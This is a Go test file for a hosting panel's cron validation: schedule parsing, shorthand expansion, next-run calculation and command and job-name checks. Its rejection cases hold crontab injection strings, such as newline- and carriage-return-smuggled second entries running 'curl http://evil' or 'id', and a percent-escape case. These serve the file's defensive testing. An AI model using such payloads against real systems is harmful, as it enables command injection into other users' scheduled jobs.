package validate_test

import (
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/jothost/panel/shared/validate"
)

func TestScheduleAcceptsOrdinaryExpressions(t *testing.T) {
	cases := []struct{ in, want string }{
		{"* * * * *", "* * * * *"},
		{"0 3 * * *", "0 3 * * *"},
		{"*/15 * * * *", "*/15 * * * *"},
		{"0 0 1 1 *", "0 0 1 1 *"},
		{"0,30 9-17 * * 1-5", "0,30 9-17 * * 1-5"},
		{"0 4 * * sun", "0 4 * * sun"},
		{"0 0 1 jan *", "0 0 1 jan *"},
		// Sunday is 0 and 7 in every cron there has ever been.
		{"0 0 * * 7", "0 0 * * 7"},
		// Extra whitespace is a typing artefact, not a different schedule.
		{"  0   3  *  * *  ", "0 3 * * *"},
	}

	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			got, err := validate.Schedule(tc.in)
			if err != nil {
				t.Fatalf("Schedule(%q): %v", tc.in, err)
			}
			if got != tc.want {
				t.Fatalf("Schedule(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestScheduleExpandsShorthands(t *testing.T) {
	// Expanded rather than passed through, so everything downstream deals with
	// one representation.
	cases := map[string]string{
		"@daily":   "0 0 * * *",
		"@hourly":  "0 * * * *",
		"@weekly":  "0 0 * * 0",
		"@monthly": "0 0 1 * *",
		"@yearly":  "0 0 1 1 *",
		"@DAILY":   "0 0 * * *",
	}

	for in, want := range cases {
		got, err := validate.Schedule(in)
		if err != nil {
			t.Fatalf("Schedule(%q): %v", in, err)
		}
		if got != want {
			t.Fatalf("Schedule(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestScheduleRejectsWhatItCannotRunSafely(t *testing.T) {
	cases := []struct {
		in     string
		reason string
	}{
		{"", "an empty schedule"},
		{"* * * *", "four fields"},
		// Six fields is the seconds-resolution form some crons accept. Taking
		// it here would run a job sixty times more often than intended.
		{"* * * * * *", "six fields"},
		{"60 * * * *", "a minute out of range"},
		{"* 24 * * *", "an hour out of range"},
		{"* * 32 * *", "a day out of range"},
		{"* * * 13 *", "a month out of range"},
		{"* * * * 8", "a weekday out of range"},
		{"* * * * mon-sun", "a range that ends before it starts"},
		{"10-5 * * * *", "a numeric range that ends before it starts"},
		{"*/0 * * * *", "a zero step"},
		{"*/-1 * * * *", "a negative step"},
		{"@reboot", "a shorthand with no schedule to describe"},
		{"@sometimes", "an invented shorthand"},
		{"* * * * *\n0 0 * * * curl evil", "a second line"},
		{"* * * * * %", "cron's stdin escape"},
		{strings.Repeat("*", 200), "an oversized expression"},
	}

	for _, tc := range cases {
		t.Run(tc.reason, func(t *testing.T) {
			if _, err := validate.Schedule(tc.in); err == nil {
				t.Fatalf("Schedule(%q) was accepted: %s", tc.in, tc.reason)
			} else if !errors.Is(err, validate.ErrInvalidSchedule) {
				t.Fatalf("Schedule(%q) = %v, want ErrInvalidSchedule", tc.in, err)
			}
		})
	}
}

// The command validation is what stands between one crontab entry and two.
func TestCommandRefusesWhatWouldWriteASecondEntry(t *testing.T) {
	cases := []struct {
		in     string
		reason string
	}{
		{"", "an empty command"},
		{"   ", "whitespace only"},
		{"php cron.php\n* * * * * curl http://evil", "a newline, which is a second entry"},
		{"php cron.php\r* * * * * id", "a carriage return"},
		{"php cron.php\x00", "a null byte"},
		// % ends the command and makes the rest standard input, with further
		// %s becoming newlines. It is a line break in disguise.
		{"mysqldump db > dump-$(date +%Y).sql", "cron's percent escape"},
		{strings.Repeat("a", validate.MaxCommandLength+1), "an oversized command"},
	}

	for _, tc := range cases {
		t.Run(tc.reason, func(t *testing.T) {
			if err := validate.Command(tc.in); err == nil {
				t.Fatalf("Command(%q) was accepted: %s", tc.in, tc.reason)
			}
		})
	}

	// What it does allow: an ordinary command line. The shell metacharacters in
	// it are not the panel's business — crond runs this as the website's own
	// account, which already has that authority over its own files.
	for _, ok := range []string{
		"php /var/www/shop.example/public/cron.php",
		"curl -fsS https://shop.example/cron",
		"/usr/bin/find /var/www/shop.example/tmp -mtime +7 -delete",
		"php artisan schedule:run >> storage/logs/cron.log 2>&1",
	} {
		if err := validate.Command(ok); err != nil {
			t.Fatalf("Command(%q) was refused: %v", ok, err)
		}
	}
}

func TestJobNameRejectsALineBreak(t *testing.T) {
	// The name is written into the crontab as a comment above the entry.
	if err := validate.JobName("nightly\n* * * * * curl http://evil"); err == nil {
		t.Fatal("a name containing a line break was accepted")
	}
	if err := validate.JobName("Nightly database dump"); err != nil {
		t.Fatalf("an ordinary name was refused: %v", err)
	}
}

func TestJobType(t *testing.T) {
	for _, ok := range validate.JobTypes() {
		if err := validate.JobType(ok); err != nil {
			t.Fatalf("JobType(%q): %v", ok, err)
		}
	}
	for _, bad := range []string{"", "shell", "PHP", "exec"} {
		if err := validate.JobType(bad); err == nil {
			t.Fatalf("JobType(%q) was accepted", bad)
		}
	}
}

func TestNextRun(t *testing.T) {
	// A Wednesday.
	base := time.Date(2026, time.August, 26, 10, 17, 30, 0, time.UTC)

	cases := []struct {
		schedule string
		want     time.Time
	}{
		{"* * * * *", time.Date(2026, time.August, 26, 10, 18, 0, 0, time.UTC)},
		{"0 * * * *", time.Date(2026, time.August, 26, 11, 0, 0, 0, time.UTC)},
		{"*/15 * * * *", time.Date(2026, time.August, 26, 10, 30, 0, 0, time.UTC)},
		{"@daily", time.Date(2026, time.August, 27, 0, 0, 0, 0, time.UTC)},
		{"0 0 1 * *", time.Date(2026, time.September, 1, 0, 0, 0, 0, time.UTC)},
		{"30 9 * * mon", time.Date(2026, time.August, 31, 9, 30, 0, 0, time.UTC)},
		// A leap day, four years out but inside the search bound.
		{"0 0 29 2 *", time.Date(2028, time.February, 29, 0, 0, 0, 0, time.UTC)},
	}

	for _, tc := range cases {
		t.Run(tc.schedule, func(t *testing.T) {
			got, ok := validate.NextRun(tc.schedule, base)
			if !ok {
				t.Fatalf("NextRun(%q) found nothing", tc.schedule)
			}
			if !got.Equal(tc.want) {
				t.Fatalf("NextRun(%q) = %s, want %s", tc.schedule, got, tc.want)
			}
		})
	}
}

// Cron's oldest and least obvious rule: when both day fields are restricted
// they are an OR, not an AND. "0 0 13 * 5" is the 13th *or* any Friday.
// Reading it as an AND makes the panel say a job runs far less often than it
// does; reading the OR wrongly runs it on days nobody asked for.
func TestNextRunAppliesCronsDayOfMonthOrDayOfWeekRule(t *testing.T) {
	// Tuesday 1 September 2026.
	base := time.Date(2026, time.September, 1, 12, 0, 0, 0, time.UTC)

	next, ok := validate.NextRun("0 0 13 * 5", base)
	if !ok {
		t.Fatal("NextRun found nothing")
	}
	// The next Friday is the 4th, which comes before the 13th.
	want := time.Date(2026, time.September, 4, 0, 0, 0, 0, time.UTC)
	if !next.Equal(want) {
		t.Fatalf("next = %s, want %s (the OR rule)", next, want)
	}

	// With only the day of month restricted, weekdays do not matter.
	next, ok = validate.NextRun("0 0 13 * *", base)
	if !ok {
		t.Fatal("NextRun found nothing")
	}
	if want := time.Date(2026, time.September, 13, 0, 0, 0, 0, time.UTC); !next.Equal(want) {
		t.Fatalf("next = %s, want %s", next, want)
	}
}

func TestNextRunReportsASchedulesThatNeverFires(t *testing.T) {
	base := time.Date(2026, time.August, 26, 10, 0, 0, 0, time.UTC)

	// 31 February is a valid expression and a job that never runs. Saying so is
	// better than showing a job that looks scheduled and never happens.
	if _, ok := validate.NextRun("0 0 31 2 *", base); ok {
		t.Fatal("31 February was reported as a schedule that fires")
	}
}
